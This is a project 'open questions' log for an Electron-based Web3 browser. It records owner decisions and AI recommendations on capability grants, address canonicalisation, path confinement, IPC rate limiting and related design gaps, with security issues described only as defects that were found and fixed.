# Open questions, contradictions and unknowns

Living document. Entries are resolved into decision records (and then removed, with a link
left behind) or explicitly parked.

Legend: **[OWNER]** product/philosophy/irreversible — never decided by an AI ·
**[AI-REC]** technical, AI proposes · **[RESEARCH]** needs investigation first.

---

## RESOLVED — see the linked record

| Was | Resolution |
|---|---|
| A1 What is the MVP for? | **Owner:** the funding plan in `roadmap.mdx` is **outdated**. MVP target is **100 active users in EU/USA, active = 25 h/month**, to attract A+ contributors, validate the product with real data, and support funding. The MVP must have real-world use |
| A2 Which capability is the thesis? | **Owner:** **A** (run any Web3 program from a URL) is primary; **B** (Web3 Scores) also important; **C** (wallet) simplified and deferred, keep architecture ready; **D** (pluggable domains) a long-term note |
| A3 Is "bitcoind in WASM" in scope? | **Owner:** it is a *future* goal for the execution layer, not an MVP claim → `ADR-0001` (flagship is BitTorrent streaming) |
| A5 Who writes the code? | **Owner:** solo; no Rust, C++ basics; Claude Max; Electron MVP, Chromium fork long-term → `ADR-0002` (TypeScript only, WASM deferred) |
| B1 Four incompatible architectures | → `ADR-0002`. Capability API is the durable asset; broker in Electron main; `orivon-runtime` deferred, not cancelled. Answers the unanswered heading in `technical/orivon-core` |
| B5 Same bytecode, two capability environments | → `ADR-0002`. Two named environments: *frontend* (renderer, ordinary web powers) and *app backend* (broker-side, capability-gated) |
| B6 "Web4 era starter" vs roadmap ordering | Dissolved: the funding plan is outdated. The product creates the movement |
| Telemetry | → `ADR-0004`. **Opt-out** with prominent first-run disclosure, self-hosted, inspectable, minimal payload. (Owner reversed an earlier opt-in decision for measurement efficiency; reversal recorded in the ADR) |
| Local vs remote app data | → `ADR-0003`. Local-first, per-origin isolation, no Orivon server for app data |
| Bundling apps vs URL delivery | → `ADR-0005`. Apps are URL-addressed and cached; flagship pre-cached, not bundled |
| A4b Site-level Trustlessity blocked on resolution | **Owner caught this.** DDOC anchors in DNS, forgeable on ICANN domains without DNSSEC → site L2 and DDOC leave the MVP; trustless resolution (D) is a **prerequisite** for them, which reorders the public roadmap. Everything else in the spectrum turned out to be automatic → `ADR-0006` |
| A4a Advertising priced by trustlessity level | **Owner decision, accepted.** Ad priority and price are keyed to trustlessity level as in `economical-strategy.md`: lower level ⇒ higher price and lower priority, as a deliberate penalty on centralised entrants. See "Accepted tradeoffs" below |
| Trust indicator scope | → `ADR-0006`. Full spectrum from observed behaviour + delivery provenance; ships the attestation hook, not a judge |
| Flagship first-run grants | **Owner (validation pass):** the real grant prompt appears in the clip — the flagship holds zero silent privileges, and the prompt showcases the permission system on camera |
| App-update re-consent friction | **Owner (validation pass):** publisher-key TOFU → `ADR-0005`. **Superseded the same day by the audit** — signing was unspecified and unscheduled, and the amendment's central claim was false (a keyless compromised host serves a 302). Now: hash-pinning + pattern-subset check + version floor |
| Telemetry EU posture | **Owner (validation pass):** first-run explicit choice, [Keep on]/[Turn off], no preselected default → `ADR-0004` amended. ~85–90% retention, defensible as consent under GDPR |
| Video format in v0 | **Owner (audit):** MP4/H.264 only; state it in-product, shoot the clip on an MP4 torrent. MSE cannot demux Matroska and neither can Chromium's `<video>`, so MKV has no path without a remuxer — post-launch (`libav-wasm`) |
| Trust indicator, given two independent breaks | **Owner (audit):** **fix it properly (~2 days)** rather than reduce or cut → `ADR-0006` amendment. Partition CSP so the manifest genuinely bounds network reach, persisted per-origin summaries, byte-asymmetry signal, evidence-first UI |
| Signed/unsigned trust tier | **Owner (audit):** **cut from v0.** Capability-identical in v0, mechanism specified nowhere, and it would have put a red UNSIGNED badge on the flagship in the clip → `ADR-0002` §4 amendment, `ADR-0005` evening amendment |
| What the metric counts | **Owner (audit):** split `activeSec` from `backgroundSec`, state the metric on `activeSec` → `ADR-0004`. A seeding tab previously satisfied 25 h/month on its own, making the daily-use hypothesis unfalsifiable in its own favour |
| Install-count arithmetic | **Corrected, owner-side.** The "115–130 installs" figure applied only the telemetry consent rate — no retention, no activation. Honest requirement is in the **thousands of downloads**. Funnel sizing and channel selection are explicitly **outside the technical work session** |
| C0 Renderer-side webtorrent (the week-0 spike) | **Resolved 2026-08-25 — architecture PASS.** Gates 0/1a/1b/2 pass with hard evidence; gate 4 (throughput) beats the actual product requirement 10x despite failing its literal relative-to-native-control threshold; gate 3 (video playback) is blocked on an unresolved Playwright/`_electron` tooling issue, not a product failure. Full verdict: `planning/spike-verdict.md`. `utilityProcess` fallback was not needed |
| A6 Go / no-go on `readiness.md` | **Owner: GO**, 2026-08-25, conditional on reviewing the spike's execution plan first → `planning/week-0-spike-plan.md` |
| A11 How a cached bundle is served at its origin | **Owner (2026-08-25):** keep the app's real origin, intercepting inside the app's `session` partition only → `ADR-0007`. Chosen over a custom scheme because changing the origin would fork storage, grants and the derived identity key between the cached and live states, with no export path to recover the lost key |
| A10 Handle contracts | **Resolved 2026-08-26.** Full specification written: `architecture/handle-contracts.md` (the five handle types, the closed error enum, close/half-close semantics, a credit-window backpressure design, the revocation cascade). Direction decision (WHATWG streams, owner, 2026-08-25) recorded as `ADR-0008`, which also rescopes `capability-api.md` design rule 1 to the shim rather than the capability layer. One further owner decision taken while writing it: error detail is real for any address an app was permitted to attempt; `denied` stays uniform across every reason for denial |
| What bytes the bundle hash actually covers | **Resolved 2026-08-26.** `ADR-0005` and `ADR-0006` both made "the bundle hash" load-bearing without ever defining it — the same gap that had already been found and cut once for publisher signing. Full construction (flat, sorted, length-prefixed list hash; manifest included as a leaf; case/Unicode-colliding paths rejected at install) specified in `ADR-0009` and `architecture/bundle-hash.md`, with frozen test vectors from an independent reference implementation |

---

## A. Awaiting owner decision

None of these block starting the week-0 spike.

| | Decision | Needed by |
|---|---|---|
| A7 | Canonical **DDOC** expansion — recommendation: *Domain Data Ownership **Confirmation*** (`glossary.md`, B2) | before correcting public docs |
| A8 | **`+Privacy`** attaches to L4 (published) or L5 (private)? (`glossary.md`) | before correcting public docs |
| A9 | Three capability-API items. **Defaults now proposed** in `architecture/capability-api.md` — `net.listen` grantable to unsigned apps with a declared port range and no privileged ports · grants keyed on `(origin, capability, pattern set)`, a **subset check** over the pattern set (not a kind comparison), with bundle-hash changes handled by the separate re-consent prompt · `fs.quotaBytes` enforced via a running per-origin counter | **Build proceeds on these unless overruled.** Cheap to change before any third-party app exists |
| A12 | **`orivon.fs` option bags are unspecified.** `capability-api.md` names the entry points (`readFile(path, opts)`, `writeFile(path, data, opts)`, `mkdir / readdir / stat / rm / rename`) but never says what `opts` contains or what `readFile` returns | **Build step 2.** Provisional signatures are in `src/contracts/capability-api.ts` and marked as such |
| A14 | **RESOLVED 2026-08-26 (owner):** a trailing DNS dot is stripped, so `https://x.example.` and `https://x.example` are ONE origin. Deliberately deviates from `URL.origin`. Exactly one dot; a host still carrying an empty label is rejected | Implemented in `src/broker/policy/origin.ts` |
| A13 | **RESOLVED 2026-08-27 (owner): Promises**, per design rule 2. Widening a Promise to a plain value later is a smaller break than the reverse. Original question: `capability-api.md` §v0 surface writes them as `=> Manifest` and `=> Grant[]`, but design rule 2 in the same document says *"All entry points return Promises"* | **Build step 2.** Transcribed as Promises; see below |
| A15 | **The four bundle-hash caps are guesses, not decisions** — `MAX_PATH_BYTES` 1024, `MAX_ASSET_BYTES` 16 MiB, `MAX_BUNDLE_BYTES` 64 MiB, `MAX_BUNDLE_ENTRIES` 4096 (`src/broker/policy/bundle-hash.ts`, `architecture/bundle-hash.md` §Caps). They are labelled AI-recommendation in the source, but a cap decides which bundles are *refusable*, so two implementations disagreeing on one disagree about whether an app can exist at all | **Before the app loader ships (build step 4).** Needs one real frontend's shape to calibrate against; guessing again now would not be better than the current guess |
| A16 | **RESOLVED 2026-08-28 (owner):** closing the last tab closes the window (option 2 below) — overrules this entry's own AI-REC, which favoured option 1. No `app.quit()` in `tabs.ts`/`window.ts`; `src/main/index.ts`'s existing `window-all-closed` handler already owns whether the whole process then exits | Implemented in `src/main/tabs.ts` (`TabManager`'s `onEmpty` callback) and `src/main/window.ts`. See below |
| A17 | **RESOLVED 2026-08-27 (owner):** an `identityId` is **opaque and broker-generated** — never a user-typed name, never derived from one. The display name is stored beside the identity, not used to derive it. Found undefined during review of PR #5: it appeared exactly once in the whole repository, as one table cell | Recorded in `ADR-0010`, stated in `capability-api.md`, documented on `DeriveRequest.scope` |
| A18 | **RESOLVED 2026-08-27 (owner): pass the GRANTED pattern list, not the manifest.** Original question: Nothing in the signature carries the grant, so a caller passing a raw manifest silently gets the declared authority | **Build step 2, before the broker calls it.** Narrow the list at the call site, or change the parameter to `readonly Pattern[]`. See below |
| A19 | **IDN hostnames are unhandled in connect patterns.** A Unicode host, its case variants and its punycode A-label are three different strings to the matcher, and an app deriving its host from `new URL(...)` gets the A-label | **Before any non-ASCII app origin exists.** Non-ASCII is now rejected outright rather than silently never matching. See below |
| A20 | **PARTIALLY RESOLVED, `stream/a20-canonical-address`.** `canonicalAddress` now lives in `address.ts` and `connect.ts`/`connect-patterns.ts` use it. Still open: the grant prompt (build step 4) and `policy/update.ts`'s pattern comparison don't use it yet | **Whoever builds either.** See below |
| A21 | **Does a re-granted capability reuse its GrantId?** `manifest.ts` says a `Grant` is keyed on (origin, capability, pattern set) but never says whether the `id` is derived from that key or minted fresh per grant event. The handle table now tombstones revoked grant ids, so under the derived reading a permanent tombstone would make re-granting impossible | **Before the grant ledger is written.** `HandleTable.grantIssued()` clears the tombstone, so the table is correct either way; the ledger must call it. See below |
| A22 | **`src/broker/policy/paths.ts` assumes app root directory names are single-case hex.** True today and specified — `security-model.md` T13b makes directory names `sha256(canonical_origin)`, and `ADR-0009` reconfirms the bundle hash does not rename them. The assumption is load-bearing for a case-SENSITIVE comparison and is asserted only in a source comment | **Build step 4 (the app loader)**, which writes the first root directory and is the first chance to get the naming wrong. See below |
| A23 | **A derived origin does not carry whether it may be PERSISTED.** T13c forbids ever writing a grant for a loopback or plain-`http` origin to disk, but `originFromUrl` returns a plain string — `http://127.0.0.1:8080` is shape-identical to `https://x.example`, so every caller must remember to re-parse and check | **Build step 2**, when the code that persists grants exists. Owner decided 2026-08-27 to keep the return type a plain string for now rather than change a durable interface before its consumer exists. See below |
| A24 | **Should a whole-codebase guideline sweep be exempt from the one-stream-per-backlog-branch rule?** `stream/backlog-07-guidelines-cleanup` touches six streams' paths at once, which `parallel-work.md` says should be six branches. AI-REC: carve out repo-wide sweeps explicitly, same shape as the PR blueprint's `type:chore` short form | **Before the next backlog-NN sweep is started.** This PR is a fait accompli either way; what's open is whether the rule gets a carve-out. See below |
| A25 | **The docs' own example of an unparseable version parses.** `capability-api.md` and `update.ts` both cite `"2026-08-26"` as a version that cannot be ordered. It orders fine -- hyphens are legal semver prerelease identifiers | Before anyone relies on the example |
| A26 | **Three port-range parsers now exist**: `connect-patterns.ts`, privately in `update.ts`, and `loader/manifest.ts`. None is legally reusable from the others as written | Rule 3; before a fourth |
| A27 | **`update.ts`'s wildcard host match and `connect-patterns.ts`'s pattern matcher disagree about what a leading `*.` means.** `update.ts`'s `hostCovers` treats `*.example.com` as a real suffix wildcard for its re-consent check; `connect-patterns.ts` treats the identical syntax as matching nothing. A manifest can declare, validate and be granted a `connect` pattern that can then never actually connect | **Before the grant prompt is built (build step 4)**, the first point a user sees a pattern spelled two different ways. See below |
| A28 | **`confinePath` takes a synchronous `realpath`, so every confined `fs` call blocks the broker's main thread.** `policy/paths.ts` declares the parameter synchronous; any broker that calls it performs blocking `stat`/`lstat` syscalls inline with otherwise-async `readFile`/`writeFile` | **Trigger re-dated 2026-09-01 (owner's decision).** `orivon.fs` is now wired to a renderer with `confinePath` still synchronous — see below for why that trigger fired a step early. Now needed **before any origin holds a real `fs` grant.** |
| A29 | **`quotaBytes` promises reconciliation against the directory on startup, and nothing implements that half.** `contracts/manifest.ts` documents a running per-origin byte counter that reconciles on startup rather than walking the tree every operation; no storage layer or `BrokerFs` member does the reconciling, so the counter resets on every restart | **Before packaging (build step 10)**, when a real user's disk is at stake. See below |
| A30 | **`CLAUDE.md` states as fact that three `BaseWindow` options are `BrowserWindow`-only; they are not.** `titleBarStyle`, `titleBarOverlay` and `trafficLightPosition` are all declared on `BaseWindowConstructorOptions` in electron 44.0.0's own `.d.ts` — only `ready-to-show` is genuinely `BrowserWindow`-only | **`/revise-claude-md`'s job; this A-number is the durable record if that pass does not run first.** See below |
| A31 | **May a non-`backlog-NN` stream branch edit a `docs`-owned file it must keep in step with its own signature change?** The borrow mechanism in `parallel-work.md`'s ownership map is written for `backlog-NN` branches only, but a signature-changing stream branch has already needed the same thing | **Before the next signature change lands. Not blocking.** See below |
| A32 | **Should the new inert toolbar icons (extensions, sidebar, identity, star, shield, hamburger) ship at all before they do anything?** Added with the chrome restyle to match the reference screenshot exactly. AI-REC: ship disabled with an honest `title` tooltip on each, revisit at that build step's readability check | **Before the chrome-restyle PR opens.** Owner override already covers drawing them; this is only about whether "disabled + honest tooltip" is the right mitigation. See below |
| A33 | **Should the bookmarks bar hide itself when there are no bookmarks?** Chrome shows the bar only on the new-tab page; this shell shows it unconditionally, which is simpler but always spends 28px on an empty row for a fresh profile | **Not blocking the restyle.** v0 always shows it. See below |
| A34 | **The tab strip's native-controls inset is a hardcoded approximation, not a measured value.** `env(titlebar-area-*)` and `navigator.windowControlsOverlay` both report empty/`false` for this shell's `BaseWindow` + `WebContentsView` chrome — confirmed by a throwaway probe app, 2026-08-28, contradicting every context7 example, which is `BrowserWindow`-only. The restyle reserves a fixed 138px (Windows/Linux, right) or 78px (macOS, left) instead | **Revisit if Electron ever wires window-controls-overlay geometry through `BaseWindow`, or once real hardware on all three platforms confirms the approximation holds.** See below |
| A35 | **`ResponseEnvelope` carries no `handleId`, though `OrivonError` declares one.** `contracts/errors.ts` specifies `platformCode` and `handleId` as optional fields an error may carry; `contracts/ipc.ts`'s `ResponseEnvelope`'s failure branch forwards `code`/`platformCode`/`message` but not `handleId`. A `'closed'` error naming which handle closed loses that identifier the moment it crosses IPC | **Before a `'closed'` error needs to name its handle over IPC** — not reachable yet (build step 2's control channel wires no method that can throw `'closed'`), but a contracts gap, so its own PR per `parallel-work.md` rule 3. See below |
| A36 | **`build-plan.md` places grant prompts in build step 2; `A20` and `A27` both say build step 4.** `build-plan.md`'s own Sequence section lists "grant prompts" under step 2 ("Capability broker"), but `A20`'s and `A27`'s "Needed by" columns both independently say "before the grant prompt is built (build step 4)" | **Before the grant prompt is scheduled.** One of the two documents is wrong; the owner should pick which. See below |
| A37 | **The write direction of the byte pump (an app writing bytes out over `TcpSocket.writable`) has no wire message anywhere.** `contracts/ipc.ts` specifies `DataMessage`/`CreditMessage`/`StreamEndMessage` in full for the READ direction only; `handle-contracts.md`'s Backpressure section, `capability-api.md`'s Throughput section and `ADR-0008` all describe the write side only as an outcome ("`write()` resolves only once the broker has accepted the bytes"), never as a protocol | **Before the preload-side byte-pump PR** (readable/writable streams built over the port) **can implement `writable`.** See below |
| A38 | **RESOLVED 2026-09-02.** `security-model.md`'s T11b entry names both a per-origin in-flight cap AND "a token-bucket rate limit on IPC dispatch" as the mitigation. The in-flight cap exists (`handles.ts`) and covers every method that does real I/O, but `app.manifest`/`app.grants` never call `handleTable.run`, so nothing bounded how *often* an origin could call them. Reproduced before the fix: 5,000 concurrent `app.grants` calls from one origin, zero rejected. A shared per-origin token bucket (`src/broker/token-bucket.ts`) now gates all six control methods uniformly, checked before `dispatch()` runs | Implemented in `src/broker/token-bucket.ts` and wired in `src/broker/ipc.ts`'s `handleControlRequest`. **The numbers (capacity 200, refill 100/sec) are AI-recommended, not owner-decided** — see below |

---

### A12 — what `orivon.fs` actually takes and returns **[AI-REC]**

Found while transcribing `capability-api.md` into `src/contracts/` (2026-08-26). The
document specifies the *fs* entry points by name only. Everything else in the v0 surface has a
full signature; these do not.

**Provisional reading, implemented and marked provisional in the file:** the contract layer is
byte-oriented — `readFile(path) => Promise<Uint8Array>`, `writeFile(path, data: Uint8Array)` —
with no encoding option, because `ADR-0008` puts bytes and streams underneath and Node's shapes
in `orivon-node-shim` one layer up. Encoding handling therefore belongs to the shim, alongside
the file cursor it already owns (`handle-contracts.md` §FileHandle).

**Why it is flagged rather than decided:** this is the `fs` half of the durable interface, and
`ADR-0002` makes that the artefact the whole project is built to outlive. A guess promoted
silently would be exactly the failure `CLAUDE.md` Rule 1 exists to prevent.

### A13 — synchronous or async app introspection **[AI-REC]**

A direct contradiction inside `capability-api.md`, found the same way. §Design rules 2 states
that all entry points return Promises because sockets cannot be constructed synchronously
across an IPC boundary. §v0 surface then writes `orivon.app.manifest() // => Manifest` and
`orivon.app.grants() // => Grant[]` without one.

**Both readings are defensible.** Design rule 2 is stated as binding. But
`handle-contracts.md`'s own rule — *anything Node exposes synchronously is resolved before the
acquisition promise settles and handed over already populated* — argues the other way: the
manifest and the grant set are both known before the app's first line runs, so they could be
plain values with no round trip.

**Transcribed as Promises**, because design rule 2 is the more explicit statement and widening
a Promise to a plain value later is a smaller break than the reverse. Cheap to change before any
third-party app exists.

---

### A16 — what closing the last tab should do **[RESOLVED]**

Found while extending `scripts/smoke.mjs` (2026-08-27). Writing a check for "closing the last
tab behaves sanely" required knowing what sane *is*, and nothing in this repository says.

**What happens today.** `TabManager.closeTab()` (`src/main/tabs.ts`) removes the view, finds no
fallback tab, sets `activeTabId: null` and emits. The `BaseWindow` stays open showing an empty
tab strip, a disabled toolbar, and no content. Nothing crashes and nothing leaks — it is simply
a state no other browser leaves you in. It was not chosen; it is what falling through the
existing branch happens to produce.

**The three plausible answers.**

| | Behaviour | Who does this |
|---|---|---|
| 1 | Keep the window, open a fresh new tab | Chrome, Edge |
| 2 | Close the window (and on the last window, quit) | Firefox, Safari, and `src/main/index.ts` already wires `window-all-closed -> app.quit()` |
| 3 | Keep the window empty, as now | nobody |

**Recommendation [AI-REC] at the time this was filed:** option 1. It was the least surprising,
it could not strand a user, and it was a two-line change in `closeTab()`.

**Resolved 2026-08-28, owner decision: option 2 instead.** The AI-REC above is superseded, not
followed — closing the last tab closes the window (and, per `window-all-closed`'s existing
non-darwin branch, quits). Chrome and Edge's option 1 leans on their own tab-restore/session
continuity to make "the window never truly closes" feel safe; this shell has no such feature, so
the same behaviour here would just be a window that never goes away for no visible reason.
Firefox and Safari's option 2 matches the plain reading of "close the last tab" better once that
crutch isn't available.

**Why this was written down before being fixed.** Picking one was a product decision, and the
smoke check asserted the pre-decision outcome — so a silent change would have looked like a
regression. The check was labelled to say so (`CURRENT BEHAVIOUR, pending A16 -- not a spec`)
and has now been rewritten to assert the resolution instead
(`scripts/smoke.mjs`).
---

### A18 -- `checkConnect` checks the declaration, not the grant **[RESOLVED 2026-08-27, owner]**

> **Owner decision: pass the GRANTED pattern list, not the manifest.** The narrowing then has
> nowhere else to happen, so the mistake becomes impossible rather than merely documented --
> the same standard `ConnectAllowed` already holds the output side to. It also makes the
> `udp.send` reuse real, since the function currently reads `net.tcp.connect` by name.
> Implemented on `stream/a18-grant-not-manifest`.

The manifest DECLARES what an app may ask for; the user GRANTS what it actually gets
(`architecture/capability-api.md` A9 SS2), and the two sets differ -- a manifest may declare
`["*:*", "192.168.1.50:5000"]` while the user granted only the first.

`checkConnect(manifest, hostArg, port, resolveFn)` reads `manifest.capabilities.net.tcp.connect`
directly. Nothing in the signature carries the grant, so a broker that passes the manifest it
fetched gets the DECLARED authority, silently. The failure mode is the one this whole subsystem
exists to prevent: an app that declared `*:*` and was granted one host would hold `*:*`.

It is documented at the top of `src/broker/policy/connect.ts` and it is not enforced there.
That is the weaker of the two options the file itself argues for -- `ConnectAllowed` deliberately
makes "dial the literal" structural rather than documented, and the input side should be held to
the same standard.

**AI recommendation:** change the parameter to `readonly Pattern[]` of GRANTED patterns. It forces
the narrowing to happen at the call site, where it has to happen anyway; it deletes the untrusted-
manifest-shape handling, since the caller will have parsed it; and it makes the `udp.send` reuse
real, because `checkConnect` currently reads `net.tcp.connect` by name.

**Not done in `stream/broker-03-connect-check`** because it is a signature change and
`development/testing.md` SS1 specifies the signature. That document has now been corrected for the
`port` parameter this stream added; a parameter change should go the same way -- docs first.

**Needed by:** whoever wires the broker in build step 2. Until then, a caller MUST narrow the
manifest's `connect` list to the granted pattern set before calling.

---

### A19 -- IDN hostnames in connect patterns **[AI-REC]**

`connect.ts` folds ASCII case only, deliberately: `toLowerCase()` applies full Unicode folding, and
U+212A KELVIN SIGN folds to `k`, so a comparison using it is wider than DNS's and can be steered.

The consequence is that a non-ASCII host has three spellings that do not match each other: the
Unicode form a human writes in a manifest, its case variants, and the punycode A-label that
`new URL(...).hostname` returns -- which is what an app actually has in hand. A manifest host
written with a Unicode letter therefore never matches the app that declared it.

This failed CLOSED, so it was never a hole. It was a trap: the author saw an unexplained denial and
there was no log line explaining it. As of `stream/broker-03-connect-check` a non-ASCII host or
pattern is REJECTED outright, with a `bad-host` reason the broker can log -- the same argument the
file already makes for `*.example.com`, that a deliberate reject is found in seconds and a silent
non-match never is.

**AI recommendation:** leave it rejected for the MVP. Making IDN work means normalising both sides
to A-labels, which needs UTS-46 -- a dependency or roughly a hundred hand-written lines in a
directory whose whole point is having neither (`src/broker/policy/README.md`). No MVP journey has a
non-ASCII origin.

**Needed by:** the first app served from a non-ASCII origin. Not before.

---

### A20 -- `address.ts` has no canonicaliser, and `connect.ts` needs one **[AI-REC]**

`classifyAddress` answers *"what range is this address in"*, and is deliberately permissive: it
must understand `0177.0.0.1` and `2130706433` in order to BLOCK them. That is right on the deny
side.

`connect.ts` also needs an IDENTITY answer on the ALLOW side -- *"will everything downstream read
this string as the same address"* -- and the two come apart exactly where it hurts. `net.isIP`
rejects `2130706433`, so `net.connect` treats it as a NAME and looks it up again: the rebinding
window reopened one layer below the check that exists to close it. Verified end to end on
2026-08-27, before the fix: a manifest declaring `2130706433:22` produced
`addresses: ["2130706433"]`, and dialling it performed a fresh DNS lookup and reached 127.0.0.1.

`connect.ts` now carries a local `isCanonicalLiteral` validator. It accepts a strict subset and
never assigns meaning, so it can only narrow what `address.ts` already decided and a disagreement
denies -- which is why it is not the duplicate parser `address.ts`'s own comments argue against.

**AI recommendation:** export `canonicalAddress(addr): string | null` from `address.ts` and delete
the local validator. One parser, no subset to keep in sync, and two other call sites want the same
thing: the grant prompt should render the canonical form rather than whatever the manifest wrote
(`2130706433:22` is `127.0.0.1:22` spelled to be unreadable), and the update subset-check in
`policy/update.ts` compares pattern strings, so two spellings of one address currently read as two
different grants.

**Not done in `stream/broker-03-connect-check`** because `address.ts` belongs to
`stream/broker-02-address` and a cross-stream edit is what `development/parallel-work.md` asks to
be raised rather than made.

**Needed by:** whoever next touches `broker-02-address`, and before the grant prompt is built in
build step 4.

**PARTIALLY RESOLVED on `stream/a20-canonical-address` (2026-08-28).** `canonicalAddress(addr):
string | null` is exported from `address.ts`, built from the same `address-parse.ts` parsers
`classifyAddress` uses; the local validator (`isCanonicalLiteral`, then living in
`canonical-host.ts`) is deleted, and both of its call sites -- `connect.ts` and
`connect-patterns.ts`'s `hostMatches` -- now compare `canonicalAddress(x) === x` instead, which is
exactly what `isCanonicalLiteral(x)` used to mean. `checkConnect`'s behaviour is unchanged: still
verified by the full existing suite (587 tests across `address.test.ts`, `connect.test.ts`,
`connect-patterns.test.ts`) passing unmodified before a single new test was added, plus four
deliberately-introduced mutants (accept a non-canonical literal at either of `connect.ts`'s two
gates simultaneously; have `canonicalAddress` echo its input instead of normalising; corrupt
`formatIpv4`'s byte order so it silently names a different address) all caught.

**The reject-vs-normalise call, made:** `canonicalAddress` NORMALISES -- `canonicalAddress('2130706433') === '127.0.0.1'`, not
`null`. An echo-only validator would give the still-open call sites below nothing to work with.
`connect.ts` keeps today's stricter "declare it legibly or the connection is refused" behaviour on
top of that by comparing the result to the input, so this is additive, not a loosening.

**One surviving mutant, found and judged equivalent rather than fixed.** Weakening
`hostMatches`'s pattern-literal check from `canonicalAddress(host) !== host` to
`canonicalAddress(host) === null` passes the full suite unmodified. Proof it cannot be observed
through `checkConnect`: `address` reaching `hostMatches` is always already canonical (`connect.ts`
enforces `canonicalAddress(address) === address` before calling it on every path), and
`canonicalAddress` is idempotent on a canonical string, so `host === address` can only be true
when `host` is itself already canonical -- making the earlier check redundant for correctness
given that invariant, provably rather than just untested. Not fixed, because
`connect.test.ts`/`connect-patterns.test.ts`'s own header rules out unit-testing `hostMatches`
directly ("do not take it"), and the check itself is pre-existing (a faithful port of
`isCanonicalLiteral`'s equivalent shape, not something this stream introduced) and stays for
defence in depth and for `udp.send`, which the file's header notes may reuse it later without
`connect.ts`'s invariant necessarily holding.

**Still open -- the two call sites named above are unchanged by this PR, deliberately:** the grant
prompt does not exist before build step 4, and editing `policy/update.ts` from this stream would
be the same cross-stream edit this entry already flagged once. Whoever builds either should read
this entry first; `canonicalAddress` is ready for both.

---

### A21 -- grant id stability across a revoke and a re-grant **[AI-REC]**

Found while fixing the revocation cascade in `src/broker/handles.ts` (review pass, 2026-08-27).

The cascade used to be a one-shot sweep: `revoke()` closed the handles a grant had
authorised and then forgot the grant entirely. An acquisition that passed the policy check
*before* the revoke and produced its socket *after* it -- the ordinary connect path -- was then
registered under a grant the user had just withdrawn, and since the permissions UI fires exactly
one revoke, nothing ever swept again. The fix is a bounded per-origin set of revoked grant ids
that `acquire`, `acquireDerived` and `run` refuse against.

That fix has one dependency the repository does not yet decide. If the ledger later mints a
**stable** `GrantId` derived from (origin, capability, pattern set), a permanent tombstone would
mean a capability the user withdrew could never be granted again -- and the failure would look
like "the grant prompt worked and the app still cannot connect", which nobody would trace back
to the handle table. If it mints a **fresh** id per grant event, tombstones are harmless forever.

**Resolved in the table, not in the ledger:** `HandleTable.grantIssued(origin, grantId)` clears
the tombstone. It is correct under both readings, and it costs the grant ledger one call at the
point where it records a grant. **Whoever writes the ledger must make that call**, and should
record here which of the two id schemes was chosen.

**Owner decision needed on:** nothing, unless the `grantIssued` call site is unwelcome. The
question is recorded because the assumption is load-bearing and was previously implicit.
### A22 — path confinement's case-sensitivity assumes single-case-hex root names **[AI-REC]**

Found while checking whether `stream/broker-04-path-confine` (merged as `ae9a13d`) was safe to
accept while `stream/broker-01-origin` was still being reworked. It was, and the rework has
since merged (PR #1) **without changing how a root is named** — the two are structurally
independent: disjoint files, `broker-04` is not stacked on `broker-01`, and
`confinePath(root, requested, realpath)` takes `root` as a parameter, never derives it.

The assumption is worth carrying forward anyway, because **nothing names a root directory yet**
— no code in the repository computes one, so the first implementation is still ahead. The
comparison in `paths.ts` between a canonicalised path and the root is deliberately
**case-sensitive**, justified by a comment citing T13b: *"Cross-platform roots are sha256(origin)
hex, single-case, so nothing legitimate collides."* That holds only as long as the root
directory name stays lowercase hex. `sha256(...)` of anything is still lowercase hex, so folding
a data hash into the string being hashed is fine — but a root named some other way (a raw
base58 CIDv0, or base64, both mixed-case) would make `confinePath` reject legitimate paths as a
spurious `symlink-escape` on case-insensitive filesystems (macOS and Windows, both supported
run-from-source targets).

**Not a security hole either way** — the failure direction is fail-closed (an app breaks, the
sandbox does not leak) — but worth stating before the code exists rather than after a confusing
bug report.

**Already specified, and that is the point:** T13b says directory names ARE
`sha256(canonical_origin)`, and `ADR-0009` reconfirms that the bundle hash does not rename them.
So this is not an open decision so much as a **constraint that currently lives only in a source
comment**, where the person implementing the app loader will not necessarily meet it.

**Needed by:** build step 4 (the app loader), which writes the first root directory. Keep root
names single-case (hex, or lowercase the encoding) — or `paths.ts`'s case-sensitivity comment
and its case-sensitivity tests have to be revisited together.

---

### A23 — a derived origin does not say whether it may be persisted **[AI-REC]**

Found while reviewing `stream/broker-01-origin` (2026-08-27). T13c forbids ever writing a
grant for a loopback, `file:` or plain-`http` origin to disk — session-scoped only, re-prompt
each launch. But `originFromUrl` returns a plain string, and `http://127.0.0.1:8080` has the
same type and shape as `https://x.example`. The rule is therefore enforceable only by every
caller remembering to re-parse the string and check, which is the shape of rule that gets
followed four times and forgotten on the fifth.

**Owner decision, 2026-08-27: keep the plain string for now.** The alternatives — returning
`{ origin, persistable }`, or adding an `isPersistableOrigin()` helper — both change or extend
a **durable** interface before the code that persists grants exists, and `ADR-0002` makes that
interface the artefact the project is built to outlive. Deciding its shape against a real
consumer at build step 2 is better than guessing now. `originFromUrl`'s doc comment states the
gap explicitly so a caller meets it at the point of use.

**Needed by:** build step 2, specifically whoever writes the grant ledger's persist path.

### A24 — should a whole-codebase guideline sweep be exempt from the one-stream-per-backlog-branch rule **[STILL OPEN]**

Found while opening the PR for `stream/backlog-07-guidelines-cleanup` (2026-08-28).
`parallel-work.md` §`backlog-NN` branches is explicit: a backlog branch borrows one stream's
paths, and "if the work would touch two streams' paths, it is two branches." That branch touches
six: `broker` (`src/broker/policy/` splits and dedups), `packaging` (`scripts/cli.mjs`,
`scripts/check-vectors.mjs`), `shell` (`src/main/channels.ts`, `update-check.ts` and its split
siblings), `telemetry` (comment cuts in `src/telemetry/`), `docs` (the guideline documents,
`devlog/`), and `shared` (`src/shared/README.md`, prose-only — no file was added under
`src/shared/`).

**Why this happened.** The plan for applying `code-guidelines.md`'s three rules across the
codebase split the work into two branches by **risk** (violations first, then near-limit
cleanup) — approved by the owner before this rule was re-checked against it. A guideline sweep
is inherently cross-cutting by nature: the whole point is touching every file that violates a
rule, wherever it lives. Splitting strictly by stream would have produced five or six branches
whose only relationship is "ran the same regex-shaped task over different directories" — real
git overhead (interleaved commits already exist and would need hunk-level splitting) for PRs
that would each read as "same mechanical change, different folder."

**Recommendation [AI-REC]:** treat a repository-wide guideline or lint-style sweep as a
carve-out from the one-stream rule, same spirit as the `type:chore` short form already carved
out of the PR blueprint's seven-section requirement — but say so explicitly in
`parallel-work.md` rather than leaving each future sweep to rediscover the tension. The ordinary
case the rule protects against (a task that happens to touch two unrelated streams) is different
in kind from a sweep that touches all of them on purpose.

